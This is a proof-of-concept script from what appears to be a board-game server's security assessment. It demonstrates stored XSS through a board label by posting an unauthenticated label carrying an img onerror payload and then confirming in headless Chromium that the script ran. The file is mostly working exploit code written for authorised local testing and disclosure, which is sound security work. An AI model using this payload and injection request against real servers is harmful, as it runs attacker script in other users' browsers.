// Stored XSS via a board label (SECURITY_ASSESSMENT.md — XSS-1).
//
// An unauthenticated client sets a board label (the `label` event, or an uploaded
// SGF `LB` field) whose text is a markup payload. The label is broadcast to and
// persisted for every room participant, and the frontend renders it with
//   text.innerHTML = txt        (boardgraphics.js:516, svg_draw_centered_text)
// on an SVG <text> element — which executes injected event handlers. Result:
// arbitrary JS in every viewer's browser, in the origin the board is embedded in.
//
// Usage (authorised local testing only):
//   go build -o /tmp/board ./cmd && /tmp/board -f config/config-memory.yaml   # :8080
//   node security/poc/browser/xss_label.js [http://localhost:8080]
//
// Requires Playwright + a Chromium (this repo's CI image ships both:
//   PLAYWRIGHT_BROWSERS_PATH=/opt/pw-browsers, playwright under /opt/node22).
//
// NOTE: the real board loads Bootstrap from a CDN. Where that CDN is reachable
// (i.e. a normal user's browser) no stub is needed and the XSS fires in the real
// app. This PoC injects a tiny window.bootstrap stub so it also runs in a
// CDN-blocked sandbox; it does not affect the vulnerability.

const path = require('path');
function loadPlaywright() {
  for (const p of ['playwright', '/opt/node22/lib/node_modules/playwright']) {
    try { return require(p); } catch (e) {}
  }
  console.error('playwright not found; `npm i -g playwright` or set NODE_PATH'); process.exit(2);
}
const { chromium } = loadPlaywright();
const http = require('http');
const base = process.argv[2] || 'http://localhost:8080';
const u = new URL(base);

function post(p, body) {
  return new Promise((res, rej) => {
    const d = Buffer.from(body);
    const r = http.request({ host: u.hostname, port: u.port, path: p, method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': d.length } },
      x => { let b = ''; x.on('data', c => b += c); x.on('end', () => res(b)); });
    r.on('error', rej); r.write(d); r.end();
  });
}

const BOOT = `window.bootstrap={Modal:class{show(){}hide(){}static getOrCreateInstance(){return new this();}},Toast:class{show(){}hide(){}static getOrCreateInstance(){return new this();}},Collapse:class{show(){}hide(){}toggle(){}static getOrCreateInstance(){return new this();}},Tooltip:class{dispose(){}},Dropdown:class{}};`;

(async () => {
  const room = 'poc-xss-' + Date.now();
  const payload = '<img src=x onerror="window.__xss=document.domain">';
  // ATTACKER (unauthenticated): inject the malicious label into the room.
  await post('/api/v1/room/' + room, JSON.stringify({ event: 'label', value: { coords: [3, 3], label: payload } }));
  console.log('[*] injected malicious label into room', room);

  const browser = await chromium.launch();
  const page = await browser.newPage();
  await page.addInitScript(BOOT);
  await page.route('**/cdn.jsdelivr.net/**', r => r.fulfill({ status: 200, contentType: 'text/css', body: '' }));

  // VICTIM: open the board.
  await page.goto(base + '/b/' + room, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(3500);

  const xss = await page.evaluate(() => window.__xss || null);
  await browser.close();
  if (xss) { console.log('[+] STORED XSS CONFIRMED — label executed JS in the victim browser (origin:', xss + ')'); process.exit(0); }
  console.log('[-] payload did not execute'); process.exit(1);
})().catch(e => { console.error('ERR', e.message); process.exit(1); });
